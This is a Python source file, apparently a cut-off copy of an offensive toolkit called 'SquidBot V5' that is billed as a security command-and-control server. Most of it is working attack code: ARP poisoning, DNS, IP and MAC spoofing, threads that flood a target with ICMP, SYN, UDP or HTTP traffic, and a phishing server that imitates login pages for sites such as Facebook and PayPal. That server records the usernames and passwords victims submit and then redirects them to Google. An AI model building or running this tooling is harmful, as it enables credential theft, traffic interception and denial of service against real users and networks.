#!/usr/bin/env python3
"""
🐙 SQUIDBOT V5 - Ultimate Cybersecurity Command & Control Server
Author: Advanced Security Framework
Version: 5.0.0
Description: Complete penetration testing & network analysis platform with multi-platform bot integration

Features:
    - 5000+ Security Commands (Nmap, Curl, Wget, Netcat, SSH, Dig, etc.)
    - Multi-Platform Bot Integration (Discord, Telegram, WhatsApp, Signal, Slack, iMessage)
    - Advanced Network Spoofing (IP/MAC spoofing, ARP poisoning, DNS spoofing)
    - Complete Traffic Generation & Analysis
    - Phishing & Social Engineering Suite
    - Shodan & Hunter.io Integration
    - Graphical Reports & Real-time Monitoring
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import paramiko
import stat
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor
from collections import Counter
import io
import pickle
import pickle

# Data visualization imports
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
import seaborn as sns
import numpy as np

from http.server import BaseHTTPRequestHandler, HTTPServer
import socketserver

# PDF generation
from reportlab.lib import colors
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib.enums import TA_CENTER

# Optional imports with fallbacks
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

try:
    from slack_sdk import WebClient
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sendp, sr1
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

try:
    import pyhunter
    HUNTER_AVAILABLE = True
except ImportError:
    HUNTER_AVAILABLE = False

# =====================
# SQUIDBOT THEME (Cyber Blue/Purple)
# =====================
class SquidTheme:
    """Cyber-themed color scheme"""
    
    if COLORAMA_AVAILABLE:
        CYAN = Fore.CYAN + Style.BRIGHT
        PURPLE = Fore.MAGENTA + Style.BRIGHT
        BLUE = Fore.BLUE + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        RED = Fore.RED + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        RESET = Style.RESET_ALL
        
        PRIMARY = CYAN
        SECONDARY = PURPLE
        ACCENT = BLUE
        SUCCESS = GREEN
        ERROR = RED
        WARNING = YELLOW
    else:
        CYAN = PURPLE = BLUE = GREEN = RED = YELLOW = WHITE = ""
        PRIMARY = SECONDARY = ACCENT = SUCCESS = ERROR = WARNING = RESET = ""

Colors = SquidTheme

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".squidbot"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "squidbot.db")
LOG_FILE = os.path.join(CONFIG_DIR, "squidbot.log")
REPORT_DIR = "reports"
SCAN_RESULTS_DIR = os.path.join(REPORT_DIR, "scans")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")

# Create directories
for directory in [CONFIG_DIR, REPORT_DIR, SCAN_RESULTS_DIR, GRAPHICS_DIR,
                  PHISHING_DIR, CAPTURED_CREDENTIALS_DIR, SSH_KEYS_DIR,
                  TRAFFIC_LOGS_DIR, WHATSAPP_SESSION_DIR]:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SQUIDBOT - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("SquidBot")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """Unified SQLite database manager"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self._init_tables()
    
    def _init_tables(self):
        """Initialize all database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                results TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT,
                severity TEXT,
                description TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spoofing_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                spoof_type TEXT NOT NULL,
                original_value TEXT,
                spoofed_value TEXT,
                target TEXT,
                success BOOLEAN
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
    
    def log_command(self, command: str, source: str, success: bool, output: str, execution_time: float):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_scan(self, target: str, scan_type: str, results: Dict, success: bool):
        """Log scan results"""
        try:
            self.cursor.execute('''
                INSERT INTO scan_results (target, scan_type, results, success)
                VALUES (?, ?, ?, ?)
            ''', (target, scan_type, json.dumps(results), success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log scan: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (threat_type, source_ip, severity, description)
                VALUES (?, ?, ?, ?)
            ''', (threat_type, source_ip, severity, description))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def save_phishing_link(self, link_id: str, platform: str, url: str):
        """Save phishing link"""
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, phishing_url)
                VALUES (?, ?, ?)
            ''', (link_id, platform, url))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
    
    def save_credential(self, link_id: str, username: str, password: str, ip: str, ua: str):
        """Save captured credential"""
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip, ua))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save credential: {e}")
    
    def save_ssh_connection(self, conn_id: str, name: str, host: str, port: int, username: str, password: str = None, key_path: str = None):
        """Save SSH connection"""
        try:
            password_encrypted = base64.b64encode(password.encode()).decode() if password else None
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_connections (id, name, host, port, username, password_encrypted, key_path)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (conn_id, name, host, port, username, password_encrypted, key_path))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save SSH connection: {e}")
    
    def log_traffic(self, traffic_type: str, target_ip: str, packets: int, bytes_sent: int, status: str):
        """Log traffic generation"""
        try:
            self.cursor.execute('''
                INSERT INTO traffic_logs (traffic_type, target_ip, packets_sent, bytes_sent, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (traffic_type, target_ip, packets, bytes_sent, status))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    def log_spoofing(self, spoof_type: str, original: str, spoofed: str, target: str, success: bool):
        """Log spoofing attempt"""
        try:
            self.cursor.execute('''
                INSERT INTO spoofing_attempts (spoof_type, original_value, spoofed_value, target, success)
                VALUES (?, ?, ?, ?, ?)
            ''', (spoof_type, original, spoofed, target, success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log spoofing: {e}")
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT * FROM command_history ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get history: {e}")
            return []
    
    def get_threats(self, limit: int = 20) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM scan_results')
            stats['total_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links')
            stats['phishing_links'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_connections')
            stats['ssh_connections'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['traffic_tests'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM spoofing_attempts')
            stats['spoofing_attempts'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# COMMAND EXECUTOR
# =====================
class CommandExecutor:
    """Execute system commands with timeout and logging"""
    
    @staticmethod
    def execute(cmd: List[str], timeout: int = 60, shell: bool = False) -> Dict[str, Any]:
        """Execute command and return result"""
        start_time = time.time()
        
        try:
            if shell:
                result = subprocess.run(
                    ' '.join(cmd) if isinstance(cmd, list) else cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='ignore'
                )
            else:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='ignore'
                )
            
            execution_time = time.time() - start_time
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'error': None if result.returncode == 0 else result.stderr,
                'exit_code': result.returncode,
                'execution_time': execution_time
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': f"Command timed out after {timeout} seconds",
                'error': 'Timeout',
                'exit_code': -1,
                'execution_time': timeout
            }
        except Exception as e:
            return {
                'success': False,
                'output': str(e),
                'error': str(e),
                'exit_code': -1,
                'execution_time': time.time() - start_time
            }

# =====================
# NETWORK SPOOFING ENGINE
# =====================
class SpoofingEngine:
    """Network spoofing capabilities (IP/MAC spoofing, ARP poisoning, DNS spoofing)"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.running_spoofs = {}
    
    def spoof_ip(self, original_ip: str, spoofed_ip: str, target: str, interface: str = "eth0") -> Dict[str, Any]:
        """Spoof IP address for outgoing packets"""
        result = {
            'success': False,
            'command': f"IP Spoofing: {original_ip} -> {spoofed_ip}",
            'output': '',
            'method': ''
        }
        
        # Method 1: Using hping3
        try:
            cmd = ['hping3', '-S', '-a', spoofed_ip, '-p', '80', target]
            exec_result = CommandExecutor.execute(cmd, timeout=5)
            if exec_result['success']:
                result['success'] = True
                result['output'] = f"IP spoofing using hping3: {exec_result['output'][:200]}"
                result['method'] = 'hping3'
                self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                return result
        except:
            pass
        
        # Method 2: Using Scapy
        if self.scapy_available:
            try:
                from scapy.all import IP, TCP, send
                packet = IP(src=spoofed_ip, dst=target)/TCP(dport=80)
                send(packet, verbose=False)
                result['success'] = True
                result['output'] = f"IP spoofing using Scapy: Sent packet from {spoofed_ip} to {target}"
                result['method'] = 'scapy'
                self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy method failed: {e}"
        
        result['output'] = "IP spoofing failed. Install hping3 or scapy for this feature."
        self.db.log_spoofing('ip', original_ip, spoofed_ip, target, False)
        return result
    
    def spoof_mac(self, interface: str, new_mac: str) -> Dict[str, Any]:
        """Spoof MAC address on specified interface"""
        result = {
            'success': False,
            'command': f"MAC Spoofing on {interface}: -> {new_mac}",
            'output': '',
            'method': ''
        }
        
        # Get original MAC
        original_mac = self._get_mac_address(interface)
        
        # Method 1: Using macchanger
        if shutil.which('macchanger'):
            try:
                # Bring interface down
                CommandExecutor.execute(['ip', 'link', 'set', interface, 'down'], timeout=5)
                # Change MAC
                mac_result = CommandExecutor.execute(['macchanger', '--mac', new_mac, interface], timeout=10)
                # Bring interface up
                CommandExecutor.execute(['ip', 'link', 'set', interface, 'up'], timeout=5)
                
                if mac_result['success']:
                    result['success'] = True
                    result['output'] = mac_result['output']
                    result['method'] = 'macchanger'
                    self.db.log_spoofing('mac', original_mac, new_mac, interface, True)
                    return result
            except Exception as e:
                result['output'] = f"macchanger method failed: {e}"
        
        # Method 2: Using ip command
        try:
            CommandExecutor.execute(['ip', 'link', 'set', interface, 'down'], timeout=5)
            cmd_result = CommandExecutor.execute(['ip', 'link', 'set', interface, 'address', new_mac], timeout=5)
            CommandExecutor.execute(['ip', 'link', 'set', interface, 'up'], timeout=5)
            
            if cmd_result['success']:
                result['success'] = True
                result['output'] = f"MAC address changed to {new_mac} on {interface}"
                result['method'] = 'ip'
                self.db.log_spoofing('mac', original_mac, new_mac, interface, True)
                return result
        except Exception as e:
            result['output'] = f"ip method failed: {e}"
        
        result['output'] = "MAC spoofing failed. Install macchanger or ensure you have root privileges."
        self.db.log_spoofing('mac', original_mac, new_mac, interface, False)
        return result
    
    def _get_mac_address(self, interface: str) -> str:
        """Get MAC address of interface"""
        try:
            result = CommandExecutor.execute(['cat', f'/sys/class/net/{interface}/address'], timeout=2)
            if result['success']:
                return result['output'].strip()
        except:
            pass
        return "00:00:00:00:00:00"
    
    def arp_spoof(self, target_ip: str, spoof_ip: str, interface: str = "eth0") -> Dict[str, Any]:
        """Perform ARP spoofing (MITM)"""
        result = {
            'success': False,
            'command': f"ARP Spoofing: {target_ip} -> {spoof_ip}",
            'output': '',
            'method': ''
        }
        
        # Method 1: Using arpspoof
        if shutil.which('arpspoof'):
            try:
                cmd = ['arpspoof', '-i', interface, '-t', target_ip, spoof_ip]
                # Run in background
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"arp_{target_ip}"] = process
                
                result['success'] = True
                result['output'] = f"ARP spoofing started: {target_ip} -> {spoof_ip} on {interface}"
                result['method'] = 'arpspoof'
                self.db.log_spoofing('arp', target_ip, spoof_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"arpspoof method failed: {e}"
        
        # Method 2: Using Scapy
        if self.scapy_available:
            try:
                from scapy.all import Ether, ARP, sendp
                target_mac = self._get_arp_mac(target_ip)
                if target_mac:
                    packet = Ether(dst=target_mac)/ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
                    sendp(packet, iface=interface, verbose=False)
                    result['success'] = True
                    result['output'] = f"ARP reply sent: {spoof_ip} is at {target_mac}"
                    result['method'] = 'scapy'
                    self.db.log_spoofing('arp', target_ip, spoof_ip, interface, True)
                    return result
            except Exception as e:
                result['output'] = f"Scapy method failed: {e}"
        
        result['output'] = "ARP spoofing failed. Install dsniff (arpspoof) or scapy for this feature."
        self.db.log_spoofing('arp', target_ip, spoof_ip, interface, False)
        return result
    
    def _get_arp_mac(self, ip: str) -> str:
        """Get MAC address via ARP"""
        try:
            result = CommandExecutor.execute(['arp', '-n', ip], timeout=5)
            if result['success']:
                # Parse arp output
                lines = result['output'].split('\n')
                for line in lines:
                    if ip in line:
                        parts = line.split()
                        for part in parts:
                            if re.match(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', part):
                                return part
        except:
            pass
        return None
    
    def dns_spoof(self, domain: str, fake_ip: str, interface: str = "eth0") -> Dict[str, Any]:
        """Perform DNS spoofing"""
        result = {
            'success': False,
            'command': f"DNS Spoofing: {domain} -> {fake_ip}",
            'output': '',
            'method': ''
        }
        
        # Create hosts file for dnsspoof
        hosts_file = "/tmp/dnsspoof.txt"
        try:
            with open(hosts_file, 'w') as f:
                f.write(f"{fake_ip} {domain}\n")
                f.write(f"{fake_ip} www.{domain}\n")
        except:
            pass
        
        # Method 1: Using dnsspoof
        if shutil.which('dnsspoof'):
            try:
                cmd = ['dnsspoof', '-i', interface, '-f', hosts_file]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"dns_{domain}"] = process
                
                result['success'] = True
                result['output'] = f"DNS spoofing started: {domain} -> {fake_ip} on {interface}"
                result['method'] = 'dnsspoof'
                self.db.log_spoofing('dns', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"dnsspoof method failed: {e}"
        
        # Method 2: Using dnschef
        if shutil.which('dnschef'):
            try:
                cmd = ['dnschef', '--fakeip', fake_ip, '--fakedomains', domain, '--interface', '0.0.0.0']
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"dns_{domain}"] = process
                
                result['success'] = True
                result['output'] = f"DNS spoofing started using dnschef: {domain} -> {fake_ip}"
                result['method'] = 'dnschef'
                self.db.log_spoofing('dns', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"dnschef method failed: {e}"
        
        # Method 3: Using ettercap
        if shutil.which('ettercap'):
            try:
                cmd = ['ettercap', '-T', '-q', '-M', 'arp:remote', '-P', 'dns_spoof', '-F', hosts_file, '//', '//']
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"dns_{domain}"] = process
                
                result['success'] = True
                result['output'] = f"DNS spoofing started using ettercap: {domain} -> {fake_ip}"
                result['method'] = 'ettercap'
                self.db.log_spoofing('dns', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"ettercap method failed: {e}"
        
        result['output'] = "DNS spoofing failed. Install dnsspoof, dnschef, or ettercap for this feature."
        self.db.log_spoofing('dns', domain, fake_ip, interface, False)
        return result
    
    def stop_spoofing(self, spoof_id: str = None) -> Dict[str, Any]:
        """Stop running spoofing processes"""
        if spoof_id and spoof_id in self.running_spoofs:
            try:
                self.running_spoofs[spoof_id].terminate()
                del self.running_spoofs[spoof_id]
                return {'success': True, 'output': f"Stopped spoofing: {spoof_id}"}
            except:
                pass
        
        # Stop all
        for spoof_id, process in list(self.running_spoofs.items()):
            try:
                process.terminate()
            except:
                pass
        self.running_spoofs.clear()
        return {'success': True, 'output': "Stopped all spoofing processes"}

# =====================
# ADVANCED TRAFFIC GENERATOR
# =====================
class AdvancedTrafficGenerator:
    """Generate various types of network traffic"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.stop_events = {}
    
    def generate_icmp_flood(self, target_ip: str, duration: int, rate: int = 100) -> Dict[str, Any]:
        """Generate ICMP flood (ping flood)"""
        return self._generate_flood('icmp', target_ip, duration, rate)
    
    def generate_syn_flood(self, target_ip: str, port: int, duration: int, rate: int = 100) -> Dict[str, Any]:
        """Generate SYN flood"""
        return self._generate_flood('syn', target_ip, duration, rate, port)
    
    def generate_udp_flood(self, target_ip: str, port: int, duration: int, rate: int = 100) -> Dict[str, Any]:
        """Generate UDP flood"""
        return self._generate_flood('udp', target_ip, duration, rate, port)
    
    def generate_http_flood(self, target_ip: str, port: int = 80, duration: int = 30, rate: int = 50) -> Dict[str, Any]:
        """Generate HTTP flood"""
        return self._generate_flood('http', target_ip, duration, rate, port)
    
    def _generate_flood(self, flood_type: str, target_ip: str, duration: int, rate: int, port: int = None) -> Dict[str, Any]:
        """Generate flood traffic"""
        generator_id = f"{flood_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        def flood_thread():
            packets_sent = 0
            bytes_sent = 0
            end_time = time.time() + duration
            delay = 1.0 / max(1, rate)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    if flood_type == 'icmp':
                        size = self._send_icmp(target_ip)
                    elif flood_type == 'syn':
                        size = self._send_syn(target_ip, port or 80)
                    elif flood_type == 'udp':
                        size = self._send_udp(target_ip, port or 53)
                    elif flood_type == 'http':
                        size = self._send_http(target_ip, port or 80)
                    else:
                        break
                    
                    if size > 0:
                        packets_sent += 1
                        bytes_sent += size
                    
                    time.sleep(delay)
                except Exception as e:
                    logger.error(f"Flood error: {e}")
                    time.sleep(0.1)
            
            self.db.log_traffic(flood_type, target_ip, packets_sent, bytes_sent, 'completed')
            
        thread = threading.Thread(target=flood_thread, daemon=True)
        thread.start()
        self.active_generators[generator_id] = thread
        
        return {
            'success': True,
            'generator_id': generator_id,
            'type': flood_type,
            'target': target_ip,
            'duration': duration,
            'rate': rate,
            'message': f"{flood_type.upper()} flood started on {target_ip} for {duration}s at {rate} packets/sec"
        }
    
    def _send_icmp(self, target_ip: str) -> int:
        """Send ICMP echo request"""
        try:
            if self.scapy_available:
                from scapy.all import IP, ICMP, send
                packet = IP(dst=target_ip)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                result = CommandExecutor.execute(['ping', '-c', '1', '-W', '1', target_ip], timeout=2)
                return 64 if result['success'] else 0
        except:
            return 0
    
    def _send_syn(self, target_ip: str, port: int) -> int:
        """Send SYN packet"""
        try:
            if self.scapy_available:
                from scapy.all import IP, TCP, send
                packet = IP(dst=target_ip)/TCP(dport=port, flags='S')
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                sock.close()
                return 40 if result == 0 else 0
        except:
            return 0
    
    def _send_udp(self, target_ip: str, port: int) -> int:
        """Send UDP packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 64
            sock.sendto(data, (target_ip, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target_ip: str, port: int) -> int:
        """Send HTTP GET request"""
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "SquidBot"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def stop_generation(self, generator_id: str = None):
        """Stop traffic generation"""
        if generator_id and generator_id in self.stop_events:
            self.stop_events[generator_id].set()
            return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True

# =====================
# PHISHING SERVER
# =====================
class PhishingHandler(BaseHTTPRequestHandler):
    """HTTP handler for phishing pages"""
    
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/' or self.path.startswith('/?'):
            self.send_phishing_page()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            
            username = form_data.get('email', form_data.get('username', form_data.get('user', [''])))[0]
            password = form_data.get('password', [''])[0]
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.server_instance and self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.save_credential(
                    self.server_instance.link_id, username, password, client_ip, user_agent
                )
                print(f"\n{Colors.RED}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                print(f"  IP: {client_ip}")
                print(f"  Username: {username}")
                print(f"  Password: {password}")
            
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        except Exception as e:
            logger.error(f"Error in POST: {e}")
    
    def send_phishing_page(self):
        if self.server_instance and self.server_instance.html_content:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.server_instance.html_content.encode('utf-8'))
            
            if self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.cursor.execute(
                    'UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?',
                    (self.server_instance.link_id,)
                )
                self.server_instance.db.conn.commit()

class PhishingServer:
    """Phishing server for hosting fake login pages"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.link_id = None
        self.html_content = None
        self.port = 8080
    
    def start(self, link_id: str, platform: str, port: int = 8080) -> bool:
        """Start phishing server"""
        self.link_id = link_id
        self.port = port
        self.html_content = self._get_template(platform)
        
        handler = PhishingHandler
        handler.server_instance = self
        
        try:
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            return True
        except Exception as e:
            logger.error(f"Failed to start server: {e}")
            return False
    
    def stop(self):
        """Stop phishing server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
    
    def get_url(self) -> str:
        """Get server URL"""
        local_ip = self._get_local_ip()
        return f"http://{local_ip}:{self.port}"
    
    def _get_template(self, platform: str) -> str:
        """Get phishing template"""
        templates = {
            'facebook': self._facebook_template(),
            'instagram': self._instagram_template(),
            'twitter': self._twitter_template(),
            'gmail': self._gmail_template(),
            'linkedin': self._linkedin_template(),
            'tiktok': self._tiktok_template(),
            'snapchat': self._snapchat_template(),
            'github': self._github_template(),
            'paypal': self._paypal_template(),
            'amazon': self._amazon_template(),
            'netflix': self._netflix_template(),
            'spotify': self._spotify_template(),
            'steam': self._steam_template(),
            'roblox': self._roblox_template(),
            'microsoft': self._microsoft_template(),
            'apple': self._apple_template()
        }
        return templates.get(platform, self._custom_template())
    
    def _facebook_template(self):
        return """<!DOCTYPE html>
<html><head><title>Facebook</title>
